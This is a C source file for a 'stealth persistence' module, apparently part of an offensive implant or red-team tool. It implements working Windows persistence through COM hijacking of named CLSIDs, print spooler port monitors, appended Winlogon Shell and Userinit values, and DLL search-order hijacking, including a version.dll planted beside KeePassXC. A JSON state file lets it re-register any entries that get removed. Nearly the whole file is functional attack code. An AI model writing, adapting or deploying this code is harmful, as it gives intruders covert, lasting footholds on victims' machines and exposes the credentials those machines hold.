/*
 * Stealth Persistence Module - Implementation
 *
 * Alternative persistence mechanisms for W6 workstream.
 *
 * Ported from:
 * - nccgroup/acCOMplice (MIT) - COM hijacking toolkit
 * - airzero24/PortMonitorPersist (MIT) - Port monitor persistence
 * - cocomelonc tutorials - C++ examples
 */

#include "stealth_persistence.h"
#include "stealth_defaults.h"
#include <winspool.h>
#include <strsafe.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "winspool.lib")

/* Registry paths */
#define HKCU_CLSID_PATH L"SOFTWARE\\Classes\\CLSID"
#define HKLM_CLSID_PATH L"SOFTWARE\\Classes\\CLSID"
#define PRINT_MONITORS_PATH L"SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors"
#define WINLOGON_PATH L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"

/* Default capacity for state store */
#define INITIAL_PERSIST_CAPACITY 32

/* ================================================================
 * COM Hijacking Functions
 * ================================================================ */

BOOL Persist_ComHijackRegister(
    const WCHAR* clsid,
    const WCHAR* dllPath,
    WCHAR* outBackupValue,
    size_t backupValueCch)
{
    if (clsid == NULL || dllPath == NULL) {
        return FALSE;
    }

    /* Build registry path: HKCU\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32 */
    WCHAR keyPath[512];
    StringCchPrintfW(keyPath, 512, L"%s\\%s\\InprocServer32", HKCU_CLSID_PATH, clsid);

    /* First, check if CLSID exists in HKLM (legitimate COM object) */
    WCHAR hklmPath[512];
    StringCchPrintfW(hklmPath, 512, L"%s\\%s", HKLM_CLSID_PATH, clsid);

    HKEY hTestKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, hklmPath, 0, KEY_READ, &hTestKey) != ERROR_SUCCESS) {
        return FALSE; /* CLSID doesn't exist in HKLM */
    }
    RegCloseKey(hTestKey);

    /* Backup existing HKCU value if present */
    if (outBackupValue != NULL && backupValueCch > 0) {
        outBackupValue[0] = L'\0';
        HKEY hBackupKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, keyPath, 0, KEY_READ, &hBackupKey) == ERROR_SUCCESS) {
            DWORD size = (DWORD)(backupValueCch * sizeof(WCHAR));
            RegQueryValueExW(hBackupKey, NULL, NULL, NULL, (LPBYTE)outBackupValue, &size);
            RegCloseKey(hBackupKey);
        }
    }

    /* Create HKCU key and set InprocServer32 default value */
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, keyPath, 0, NULL, REG_OPTION_NON_VOLATILE,
                        KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
        return FALSE;
    }

    /* Set default value to DLL path */
    DWORD size = (DWORD)((wcslen(dllPath) + 1) * sizeof(WCHAR));
    LONG result = RegSetValueExW(hKey, NULL, 0, REG_SZ, (LPBYTE)dllPath, size);

    /* Set ThreadingModel */
    if (result == ERROR_SUCCESS) {
        const WCHAR* threading = L"Both";
        size = (DWORD)((wcslen(threading) + 1) * sizeof(WCHAR));
        RegSetValueExW(hKey, L"ThreadingModel", 0, REG_SZ, (LPBYTE)threading, size);
    }

    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

BOOL Persist_ComHijackRemove(
    const WCHAR* clsid,
    const WCHAR* originalValue)
{
    if (clsid == NULL) {
        return FALSE;
    }

    WCHAR keyPath[512];
    StringCchPrintfW(keyPath, 512, L"%s\\%s\\InprocServer32", HKCU_CLSID_PATH, clsid);

    if (originalValue != NULL && originalValue[0] != L'\0') {
        /* Restore original value */
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, keyPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            DWORD size = (DWORD)((wcslen(originalValue) + 1) * sizeof(WCHAR));
            RegSetValueExW(hKey, NULL, 0, REG_SZ, (LPBYTE)originalValue, size);
            RegCloseKey(hKey);
            return TRUE;
        }
    } else {
        /* Delete the key entirely */
        WCHAR clsidPath[512];
        StringCchPrintfW(clsidPath, 512, L"%s\\%s", HKCU_CLSID_PATH, clsid);
        return (RegDeleteTreeW(HKEY_CURRENT_USER, clsidPath) == ERROR_SUCCESS);
    }

    return FALSE;
}

BOOL Persist_ComHijackIsActive(
    const WCHAR* clsid,
    const WCHAR* expectedDllPath)
{
    if (clsid == NULL || expectedDllPath == NULL) {
        return FALSE;
    }

    WCHAR keyPath[512];
    StringCchPrintfW(keyPath, 512, L"%s\\%s\\InprocServer32", HKCU_CLSID_PATH, clsid);

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, keyPath, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }

    WCHAR currentValue[MAX_PATH] = {0};
    DWORD size = sizeof(currentValue);
    LONG result = RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)currentValue, &size);
    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS) {
        return FALSE;
    }

    return (_wcsicmp(currentValue, expectedDllPath) == 0);
}

DWORD Persist_ComFindHijackable(
    WCHAR** outClsids,
    DWORD maxClsids)
{
    if (outClsids == NULL || maxClsids == 0) {
        return 0;
    }

    /* Well-known hijackable CLSIDs that are commonly loaded */
    static const WCHAR* knownHijackable[] = {
        CLSID_MMDEVICE_ENUMERATOR,   /* Audio device enumerator */
        L"{42aedc87-2188-41fd-b9a3-0c966feabec1}", /* CLSID_NewStartMenuShellFolder */
        L"{9BBBB3C9-AF0F-4E03-82C9-8C2B2A7EB3FC}", /* Shell CopyHook handler */
    };

    DWORD count = 0;
    for (DWORD i = 0; i < sizeof(knownHijackable)/sizeof(knownHijackable[0]) && count < maxClsids; i++) {
        /* Check if CLSID exists in HKLM but not yet in HKCU */
        WCHAR hklmPath[512];
        StringCchPrintfW(hklmPath, 512, L"%s\\%s", HKLM_CLSID_PATH, knownHijackable[i]);

        HKEY hKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, hklmPath, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);

            /* Check HKCU doesn't already have it */
            WCHAR hkcuPath[512];
            StringCchPrintfW(hkcuPath, 512, L"%s\\%s", HKCU_CLSID_PATH, knownHijackable[i]);

            if (RegOpenKeyExW(HKEY_CURRENT_USER, hkcuPath, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
                /* Not in HKCU - hijackable */
                size_t len = wcslen(knownHijackable[i]) + 1;
                outClsids[count] = (WCHAR*)HeapAlloc(GetProcessHeap(), 0, len * sizeof(WCHAR));
                if (outClsids[count] != NULL) {
                    StringCchCopyW(outClsids[count], len, knownHijackable[i]);
                    count++;
                }
            } else {
                RegCloseKey(hKey);
            }
        }
    }

    return count;
}

/* ================================================================
 * Print Spooler Port Monitor Functions
 * ================================================================ */

BOOL Persist_PortMonitorRegister(
    const WCHAR* monitorName,
    const WCHAR* dllPath)
{
    if (monitorName == NULL || dllPath == NULL) {
        return FALSE;
    }

    /* Build registry path */
    WCHAR keyPath[512];
    StringCchPrintfW(keyPath, 512, L"%s\\%s", PRINT_MONITORS_PATH, monitorName);

    /* Create key */
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, NULL, REG_OPTION_NON_VOLATILE,
                        KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
        return FALSE;
    }

    /* Extract just the DLL filename */
    const WCHAR* dllName = wcsrchr(dllPath, L'\\');
    if (dllName != NULL) {
        dllName++; /* Skip backslash */
    } else {
        dllName = dllPath;
    }

    /* Set Driver value */
    DWORD size = (DWORD)((wcslen(dllName) + 1) * sizeof(WCHAR));
    LONG result = RegSetValueExW(hKey, L"Driver", 0, REG_SZ, (LPBYTE)dllName, size);

    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

BOOL Persist_PortMonitorRemove(const WCHAR* monitorName)
{
    if (monitorName == NULL) {
        return FALSE;
    }

    WCHAR keyPath[512];
    StringCchPrintfW(keyPath, 512, L"%s\\%s", PRINT_MONITORS_PATH, monitorName);

    return (RegDeleteTreeW(HKEY_LOCAL_MACHINE, keyPath) == ERROR_SUCCESS);
}

BOOL Persist_PortMonitorIsActive(const WCHAR* monitorName)
{
    if (monitorName == NULL) {
        return FALSE;
    }

    WCHAR keyPath[512];
    StringCchPrintfW(keyPath, 512, L"%s\\%s", PRINT_MONITORS_PATH, monitorName);

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return TRUE;
    }

    return FALSE;
}

BOOL Persist_PortMonitorAddImmediate(
    const WCHAR* monitorName,
    const WCHAR* dllPath)
{
    if (monitorName == NULL || dllPath == NULL) {
        return FALSE;
    }

    MONITOR_INFO_2W mi = {0};
    mi.pName = (LPWSTR)monitorName;
    mi.pEnvironment = L"Windows x64";
    mi.pDLLName = (LPWSTR)dllPath;

    return AddMonitorW(NULL, 2, (LPBYTE)&mi);
}

/* ================================================================
 * Winlogon Persistence Functions
 * ================================================================ */

BOOL Persist_WinlogonShellAppend(
    const WCHAR* exePath,
    WCHAR* outOriginalValue,
    size_t originalValueCch)
{
    if (exePath == NULL) {
        return FALSE;
    }

    /* Read current Shell value */
    WCHAR currentShell[1024] = {0};
    HKEY hKey;

    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, WINLOGON_PATH, 0, KEY_READ | KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }

    DWORD size = sizeof(currentShell);
    DWORD type = 0;
    LONG result = RegQueryValueExW(hKey, L"Shell", NULL, &type, (LPBYTE)currentShell, &size);

    if (result != ERROR_SUCCESS || currentShell[0] == L'\0') {
        StringCchCopyW(currentShell, 1024, L"explorer.exe");
    }

    /* Backup original */
    if (outOriginalValue != NULL && originalValueCch > 0) {
        StringCchCopyW(outOriginalValue, originalValueCch, currentShell);
    }

    /* Check if already appended */
    if (wcsstr(currentShell, exePath) != NULL) {
        RegCloseKey(hKey);
        return TRUE; /* Already present */
    }

    /* Append our executable */
    WCHAR newShell[1024];
    StringCchPrintfW(newShell, 1024, L"%s,%s", currentShell, exePath);

    size = (DWORD)((wcslen(newShell) + 1) * sizeof(WCHAR));
    result = RegSetValueExW(hKey, L"Shell", 0, REG_SZ, (LPBYTE)newShell, size);

    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

BOOL Persist_WinlogonShellRestore(const WCHAR* originalValue)
{
    if (originalValue == NULL || originalValue[0] == L'\0') {
        return FALSE;
    }

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, WINLOGON_PATH, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }

    DWORD size = (DWORD)((wcslen(originalValue) + 1) * sizeof(WCHAR));
    LONG result = RegSetValueExW(hKey, L"Shell", 0, REG_SZ, (LPBYTE)originalValue, size);

    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

BOOL Persist_WinlogonUserinitAppend(
    const WCHAR* exePath,
    WCHAR* outOriginalValue,
    size_t originalValueCch)
{
    if (exePath == NULL) {
        return FALSE;
    }

    WCHAR currentUserinit[1024] = {0};
    HKEY hKey;

    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, WINLOGON_PATH, 0, KEY_READ | KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }

    DWORD size = sizeof(currentUserinit);
    DWORD type = 0;
    LONG result = RegQueryValueExW(hKey, L"Userinit", NULL, &type, (LPBYTE)currentUserinit, &size);

    if (result != ERROR_SUCCESS || currentUserinit[0] == L'\0') {
        StringCchCopyW(currentUserinit, 1024, L"C:\\Windows\\system32\\userinit.exe,");
    }

    /* Backup original */
    if (outOriginalValue != NULL && originalValueCch > 0) {
        StringCchCopyW(outOriginalValue, originalValueCch, currentUserinit);
    }

    /* Check if already appended */
    if (wcsstr(currentUserinit, exePath) != NULL) {
        RegCloseKey(hKey);
        return TRUE;
    }

    /* Append our executable */
    WCHAR newUserinit[1024];
    StringCchPrintfW(newUserinit, 1024, L"%s%s,", currentUserinit, exePath);

    size = (DWORD)((wcslen(newUserinit) + 1) * sizeof(WCHAR));
    result = RegSetValueExW(hKey, L"Userinit", 0, REG_SZ, (LPBYTE)newUserinit, size);

    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

BOOL Persist_WinlogonUserinitRestore(const WCHAR* originalValue)
{
    if (originalValue == NULL || originalValue[0] == L'\0') {
        return FALSE;
    }

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, WINLOGON_PATH, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }

    DWORD size = (DWORD)((wcslen(originalValue) + 1) * sizeof(WCHAR));
    LONG result = RegSetValueExW(hKey, L"Userinit", 0, REG_SZ, (LPBYTE)originalValue, size);

    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

/* ================================================================
 * DLL Search Order Hijacking Functions
 * ================================================================ */

DWORD Persist_DllHijackFindTargets(
    DllHijackTarget* outTargets,
    DWORD maxTargets)
{
    if (outTargets == NULL || maxTargets == 0) {
        return 0;
    }

    /* Known DLL hijack targets */
    static const struct {
        const WCHAR* dllName;
        const WCHAR* targetExe;
    } knownTargets[] = {
        { L"version.dll", L"KeePassXC.exe" },
        { L"WINMM.dll", L"notepad.exe" },
        { L"dwmapi.dll", L"explorer.exe" },
    };

    DWORD count = 0;
    for (DWORD i = 0; i < sizeof(knownTargets)/sizeof(knownTargets[0]) && count < maxTargets; i++) {
        StringCchCopyW(outTargets[count].dllName, 64, knownTargets[i].dllName);
        StringCchCopyW(outTargets[count].targetExe, MAX_PATH, knownTargets[i].targetExe);
        /* Hijack path would be in same directory as target exe */
        outTargets[count].hijackPath[0] = L'\0';
        count++;
    }

    return count;
}

BOOL Persist_DllHijackInstall(
    const WCHAR* dllName,
    const WCHAR* hijackPath,
    const WCHAR* payloadDllPath)
{
    if (dllName == NULL || hijackPath == NULL || payloadDllPath == NULL) {
        return FALSE;
    }

    /* Build full path */
    WCHAR fullPath[MAX_PATH];
    StringCchPrintfW(fullPath, MAX_PATH, L"%s\\%s", hijackPath, dllName);

    /* Copy payload DLL to hijack location */
    return CopyFileW(payloadDllPath, fullPath, FALSE);
}

BOOL Persist_DllHijackRemove(const WCHAR* hijackPath)
{
    if (hijackPath == NULL) {
        return FALSE;
    }

    return DeleteFileW(hijackPath);
}

BOOL Persist_DllHijackGenerateProxy(
    const WCHAR* originalDllPath,
    const WCHAR* outputPath,
    const WCHAR* payloadDllPath)
{
    /* Generating a proxy DLL requires code generation
     * This is a placeholder - actual implementation would need
     * to generate a DLL that exports all functions from original
     * and loads payload */
    (void)originalDllPath;
    (void)outputPath;
    (void)payloadDllPath;
    return FALSE;
}

/* ================================================================
 * Persistence State Management
 * ================================================================ */

BOOL Persist_StateInit(
    PersistenceState* state,
    const WCHAR* stateFilePath)
{
    if (state == NULL) {
        return FALSE;
    }

    ZeroMemory(state, sizeof(PersistenceState));

    if (stateFilePath != NULL) {
        StringCchCopyW(state->stateFilePath, MAX_PATH, stateFilePath);
    } else {
        StringCchPrintfW(state->stateFilePath, MAX_PATH,
                        L"C:\\ProgramData\\%s\\persistence.json", STEALTH_FALLBACK_SERVICE_NAME);
    }

    state->entryCapacity = INITIAL_PERSIST_CAPACITY;
    state->entries = (PersistenceEntry*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                                                  state->entryCapacity * sizeof(PersistenceEntry));
    if (state->entries == NULL) {
        return FALSE;
    }

    return TRUE;
}

void Persist_StateFree(PersistenceState* state)
{
    if (state == NULL) {
        return;
    }

    if (state->entries != NULL) {
        HeapFree(GetProcessHeap(), 0, state->entries);
        state->entries = NULL;
    }

    state->entryCount = 0;
    state->entryCapacity = 0;
}

/* Helper to find next JSON string value after a key */
static const char* FindJsonStringValue(const char* json, const char* key, char* outValue, size_t outSize)
{
    char searchKey[64];
    sprintf_s(searchKey, sizeof(searchKey), "\"%s\"", key);

    const char* keyPos = strstr(json, searchKey);
    if (!keyPos) return NULL;

    /* Find colon after key */
    const char* colon = strchr(keyPos + strlen(searchKey), ':');
    if (!colon) return NULL;

    /* Skip whitespace and find opening quote */
    const char* ptr = colon + 1;
    while (*ptr == ' ' || *ptr == '\t' || *ptr == '\n' || *ptr == '\r') ptr++;

    if (*ptr != '"') return NULL;
    ptr++; /* Skip opening quote */

    /* Copy until closing quote, handling escapes */
    size_t i = 0;
    while (*ptr && *ptr != '"' && i < outSize - 1) {
        if (*ptr == '\\' && *(ptr + 1)) {
            ptr++; /* Skip escape char */
            if (*ptr == 'n') outValue[i++] = '\n';
            else if (*ptr == 't') outValue[i++] = '\t';
            else if (*ptr == '\\') outValue[i++] = '\\';
            else if (*ptr == '"') outValue[i++] = '"';
            else outValue[i++] = *ptr;
        } else {
            outValue[i++] = *ptr;
        }
        ptr++;
    }
    outValue[i] = '\0';

    return (*ptr == '"') ? ptr + 1 : NULL;
}

/* Helper to find next JSON integer value after a key */
static const char* FindJsonIntValue(const char* json, const char* key, int* outValue)
{
    char searchKey[64];
    sprintf_s(searchKey, sizeof(searchKey), "\"%s\"", key);

    const char* keyPos = strstr(json, searchKey);
    if (!keyPos) return NULL;

    const char* colon = strchr(keyPos + strlen(searchKey), ':');
    if (!colon) return NULL;

    const char* ptr = colon + 1;
    while (*ptr == ' ' || *ptr == '\t' || *ptr == '\n' || *ptr == '\r') ptr++;

    *outValue = atoi(ptr);

    /* Skip past the number */
    while (*ptr == '-' || (*ptr >= '0' && *ptr <= '9')) ptr++;
    return ptr;
}

/* Helper to find next JSON boolean value after a key */
static const char* FindJsonBoolValue(const char* json, const char* key, BOOL* outValue)
{
    char searchKey[64];
    sprintf_s(searchKey, sizeof(searchKey), "\"%s\"", key);

    const char* keyPos = strstr(json, searchKey);
    if (!keyPos) return NULL;

    const char* colon = strchr(keyPos + strlen(searchKey), ':');
    if (!colon) return NULL;

    const char* ptr = colon + 1;
    while (*ptr == ' ' || *ptr == '\t' || *ptr == '\n' || *ptr == '\r') ptr++;

    if (strncmp(ptr, "true", 4) == 0) {
        *outValue = TRUE;
        return ptr + 4;
    } else if (strncmp(ptr, "false", 5) == 0) {
        *outValue = FALSE;
        return ptr + 5;
    }
    return NULL;
}

BOOL Persist_StateLoad(PersistenceState* state)
{
    if (state == NULL || state->stateFilePath[0] == L'\0') {
        return FALSE;
    }

    HANDLE hFile = CreateFileW(state->stateFilePath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE; /* File doesn't exist - not an error for first run */
    }

    /* Get file size */
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0 || fileSize == INVALID_FILE_SIZE || fileSize > 10 * 1024 * 1024) {
        CloseHandle(hFile);
        return (fileSize == 0); /* Empty file is OK */
    }

    /* Read file content */
    char* content = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize + 1);
    if (content == NULL) {
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, content, fileSize, &bytesRead, NULL) || bytesRead == 0) {
        HeapFree(GetProcessHeap(), 0, content);
        CloseHandle(hFile);
        return FALSE;
    }
    CloseHandle(hFile);
    content[bytesRead] = '\0';

    /* Find entries array */
    const char* entriesStart = strstr(content, "\"entries\"");
    if (entriesStart == NULL) {
        HeapFree(GetProcessHeap(), 0, content);
        return TRUE; /* No entries - valid empty state */
    }

    /* Find opening bracket of array */
    const char* arrayStart = strchr(entriesStart, '[');
    if (arrayStart == NULL) {
        HeapFree(GetProcessHeap(), 0, content);
        return TRUE;
    }

    /* Parse each entry object */
    const char* ptr = arrayStart + 1;
    while (ptr && *ptr) {
        /* Find next object start */
        const char* objStart = strchr(ptr, '{');
        if (objStart == NULL) break;

        /* Find object end */
        const char* objEnd = strchr(objStart, '}');
        if (objEnd == NULL) break;

        /* Extract a single entry's JSON (copy to temp buffer) */
        size_t objLen = objEnd - objStart + 1;
        char* objJson = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, objLen + 1);
        if (objJson == NULL) break;
        memcpy(objJson, objStart, objLen);
        objJson[objLen] = '\0';

        /* Parse entry fields */
        int typeVal = 0;
        char identifierUtf8[512] = {0};
        char targetPathUtf8[MAX_PATH] = {0};
        char backupDataUtf8[1024] = {0};
        BOOL active = FALSE;

        FindJsonIntValue(objJson, "type", &typeVal);
        FindJsonStringValue(objJson, "identifier", identifierUtf8, sizeof(identifierUtf8));
        FindJsonStringValue(objJson, "targetPath", targetPathUtf8, sizeof(targetPathUtf8));
        FindJsonStringValue(objJson, "backupData", backupDataUtf8, sizeof(backupDataUtf8));
        FindJsonBoolValue(objJson, "active", &active);

        HeapFree(GetProcessHeap(), 0, objJson);

        /* Convert UTF8 to wide strings and add entry */
        if (identifierUtf8[0] != '\0') {
            WCHAR identifierW[256] = {0};
            WCHAR targetPathW[MAX_PATH] = {0};
            WCHAR backupDataW[1024] = {0};

            MultiByteToWideChar(CP_UTF8, 0, identifierUtf8, -1, identifierW, 256);
            MultiByteToWideChar(CP_UTF8, 0, targetPathUtf8, -1, targetPathW, MAX_PATH);
            MultiByteToWideChar(CP_UTF8, 0, backupDataUtf8, -1, backupDataW, 1024);

            /* Expand array if needed */
            if (state->entryCount >= state->entryCapacity) {
                DWORD newCapacity = state->entryCapacity * 2;
                if (newCapacity == 0) newCapacity = INITIAL_PERSIST_CAPACITY;
                PersistenceEntry* newEntries = (PersistenceEntry*)HeapReAlloc(
                    GetProcessHeap(), HEAP_ZERO_MEMORY,
                    state->entries, newCapacity * sizeof(PersistenceEntry));
                if (newEntries == NULL) break;
                state->entries = newEntries;
                state->entryCapacity = newCapacity;
            }

            /* Add entry */
            PersistenceEntry* entry = &state->entries[state->entryCount];
            ZeroMemory(entry, sizeof(PersistenceEntry));
            entry->type = (PersistenceType)typeVal;
            StringCchCopyW(entry->identifier, 256, identifierW);
            StringCchCopyW(entry->targetPath, MAX_PATH, targetPathW);
            StringCchCopyW(entry->backupData, 1024, backupDataW);
            entry->active = active;
            state->entryCount++;
        }

        ptr = objEnd + 1;
    }

    HeapFree(GetProcessHeap(), 0, content);
    return TRUE;
}

BOOL Persist_StateSave(const PersistenceState* state)
{
    if (state == NULL || state->stateFilePath[0] == L'\0') {
        return FALSE;
    }

    /* Ensure directory exists */
    WCHAR dirPath[MAX_PATH];
    StringCchCopyW(dirPath, MAX_PATH, state->stateFilePath);
    WCHAR* lastSlash = wcsrchr(dirPath, L'\\');
    if (lastSlash != NULL) {
        *lastSlash = L'\0';
        CreateDirectoryW(dirPath, NULL);
    }

    HANDLE hFile = CreateFileW(state->stateFilePath, GENERIC_WRITE, 0,
                               NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    /* Write JSON format */
    char header[] = "{\"version\":1,\"entries\":[\n";
    DWORD written = 0;
    WriteFile(hFile, header, (DWORD)strlen(header), &written, NULL);

    for (DWORD i = 0; i < state->entryCount; i++) {
        const PersistenceEntry* entry = &state->entries[i];
        char buffer[4096];
        char identifierUtf8[512];
        char targetPathUtf8[MAX_PATH];
        char backupDataUtf8[2048];

        WideCharToMultiByte(CP_UTF8, 0, entry->identifier, -1, identifierUtf8, sizeof(identifierUtf8), NULL, NULL);
        WideCharToMultiByte(CP_UTF8, 0, entry->targetPath, -1, targetPathUtf8, sizeof(targetPathUtf8), NULL, NULL);
        WideCharToMultiByte(CP_UTF8, 0, entry->backupData, -1, backupDataUtf8, sizeof(backupDataUtf8), NULL, NULL);

        /* Escape backslashes in paths for JSON */
        char escapedIdentifier[1024] = {0};
        char escapedTargetPath[MAX_PATH * 2] = {0};
        char escapedBackupData[4096] = {0};
        char* dst;
        const char* src;

        for (dst = escapedIdentifier, src = identifierUtf8; *src && dst < escapedIdentifier + sizeof(escapedIdentifier) - 2; src++) {
            if (*src == '\\' || *src == '"') *dst++ = '\\';
            *dst++ = *src;
        }
        *dst = '\0';

        for (dst = escapedTargetPath, src = targetPathUtf8; *src && dst < escapedTargetPath + sizeof(escapedTargetPath) - 2; src++) {
            if (*src == '\\' || *src == '"') *dst++ = '\\';
            *dst++ = *src;
        }
        *dst = '\0';

        for (dst = escapedBackupData, src = backupDataUtf8; *src && dst < escapedBackupData + sizeof(escapedBackupData) - 2; src++) {
            if (*src == '\\' || *src == '"') *dst++ = '\\';
            *dst++ = *src;
        }
        *dst = '\0';

        int len = sprintf_s(buffer, sizeof(buffer),
            "%s{\"type\":%d,\"identifier\":\"%s\",\"targetPath\":\"%s\",\"backupData\":\"%s\",\"active\":%s}",
            i > 0 ? ",\n" : "",
            (int)entry->type,
            escapedIdentifier,
            escapedTargetPath,
            escapedBackupData,
            entry->active ? "true" : "false");

        if (len > 0) {
            WriteFile(hFile, buffer, len, &written, NULL);
        }
    }

    char footer[] = "\n]}\n";
    WriteFile(hFile, footer, (DWORD)strlen(footer), &written, NULL);

    CloseHandle(hFile);
    return TRUE;
}

BOOL Persist_StateAddEntry(
    PersistenceState* state,
    PersistenceType type,
    const WCHAR* identifier,
    const WCHAR* targetPath,
    const WCHAR* backupData)
{
    if (state == NULL || identifier == NULL) {
        return FALSE;
    }

    /* Expand array if needed */
    if (state->entryCount >= state->entryCapacity) {
        DWORD newCapacity = state->entryCapacity * 2;
        PersistenceEntry* newEntries = (PersistenceEntry*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                                                                       state->entries, newCapacity * sizeof(PersistenceEntry));
        if (newEntries == NULL) {
            return FALSE;
        }
        state->entries = newEntries;
        state->entryCapacity = newCapacity;
    }

    PersistenceEntry* entry = &state->entries[state->entryCount];
    ZeroMemory(entry, sizeof(PersistenceEntry));

    entry->type = type;
    StringCchCopyW(entry->identifier, 256, identifier);
    if (targetPath != NULL) {
        StringCchCopyW(entry->targetPath, MAX_PATH, targetPath);
    }
    if (backupData != NULL) {
        StringCchCopyW(entry->backupData, 1024, backupData);
    }
    entry->active = TRUE;

    state->entryCount++;
    return TRUE;
}

BOOL Persist_RemoveAll(PersistenceState* state)
{
    if (state == NULL) {
        return FALSE;
    }

    BOOL success = TRUE;

    for (DWORD i = 0; i < state->entryCount; i++) {
        PersistenceEntry* entry = &state->entries[i];

        switch (entry->type) {
            case PERSIST_COM_HIJACK:
                if (!Persist_ComHijackRemove(entry->identifier, entry->backupData)) {
                    success = FALSE;
                }
                break;

            case PERSIST_PORT_MONITOR:
                if (!Persist_PortMonitorRemove(entry->identifier)) {
                    success = FALSE;
                }
                break;

            case PERSIST_WINLOGON_SHELL:
                if (!Persist_WinlogonShellRestore(entry->backupData)) {
                    success = FALSE;
                }
                break;

            case PERSIST_WINLOGON_USERINIT:
                if (!Persist_WinlogonUserinitRestore(entry->backupData)) {
                    success = FALSE;
                }
                break;

            case PERSIST_DLL_HIJACK:
                if (!Persist_DllHijackRemove(entry->targetPath)) {
                    success = FALSE;
                }
                break;

            default:
                break;
        }

        entry->active = FALSE;
    }

    /* Delete state file */
    DeleteFileW(state->stateFilePath);

    return success;
}

BOOL Persist_VerifyAll(
    PersistenceState* state,
    DWORD* outActiveCount,
    DWORD* outInactiveCount)
{
    if (state == NULL) {
        return FALSE;
    }

    DWORD active = 0;
    DWORD inactive = 0;

    for (DWORD i = 0; i < state->entryCount; i++) {
        PersistenceEntry* entry = &state->entries[i];
        BOOL isActive = FALSE;

        switch (entry->type) {
            case PERSIST_COM_HIJACK:
                isActive = Persist_ComHijackIsActive(entry->identifier, entry->targetPath);
                break;

            case PERSIST_PORT_MONITOR:
                isActive = Persist_PortMonitorIsActive(entry->identifier);
                break;

            default:
                isActive = entry->active;
                break;
        }

        if (isActive) {
            active++;
        } else {
            inactive++;
        }

        entry->active = isActive;
    }

    if (outActiveCount != NULL) {
        *outActiveCount = active;
    }
    if (outInactiveCount != NULL) {
        *outInactiveCount = inactive;
    }

    return TRUE;
}

BOOL Persist_RestoreAll(PersistenceState* state)
{
    if (state == NULL) {
        return FALSE;
    }

    BOOL success = TRUE;

    for (DWORD i = 0; i < state->entryCount; i++) {
        PersistenceEntry* entry = &state->entries[i];

        if (!entry->active) {
            switch (entry->type) {
                case PERSIST_COM_HIJACK:
                    if (Persist_ComHijackRegister(entry->identifier, entry->targetPath, NULL, 0)) {
                        entry->active = TRUE;
                    } else {
                        success = FALSE;
                    }
                    break;

                case PERSIST_PORT_MONITOR:
                    if (Persist_PortMonitorRegister(entry->identifier, entry->targetPath)) {
                        entry->active = TRUE;
                    } else {
                        success = FALSE;
                    }
                    break;

                default:
                    break;
            }
        }
    }

    return success;
}
